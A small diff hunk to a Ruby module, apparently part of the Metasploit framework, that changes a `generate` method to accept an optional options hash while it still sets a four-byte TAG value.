@@ -41,7 +41,7 @@ module MetasploitModule
   #
   # Ensures the setting of TAG to a four byte value
   #
-  def generate
+  def generate(_opts = {})
     datastore['TAG'] = _find_tag
 
     super
